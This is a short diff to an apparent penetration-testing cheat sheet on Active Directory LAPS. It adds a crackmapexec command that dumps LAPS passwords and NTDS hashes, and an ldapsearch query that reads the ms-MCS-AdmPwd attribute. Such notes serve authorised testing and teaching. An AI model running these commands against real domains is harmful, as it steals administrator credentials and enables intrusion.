@@ -12,4 +12,10 @@
 
 #### 4) Get-AdmPwdPassword -ComputerName PC_THAT_HAS_LAPS_ENABLED
 
-## Possible tools: LAPSToolkit
+## Possible tools: LAPSToolkit, Crackmapexec, ldapsearch
+
+### If a user has access to view the LAPS password, we can use crackmapexec or ldapsearch to dump password:
+
+#### crackmapexec smb IP_ADDRESS -u USER -p PASSWORD --laps --ntds
+
+#### ldapsearch -h IP_ADDRESS -b 'DC=DOMAIN,DC=LOCAL' -x -D USER@DOMAIN.LOCAL -w 'PASSWORD' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
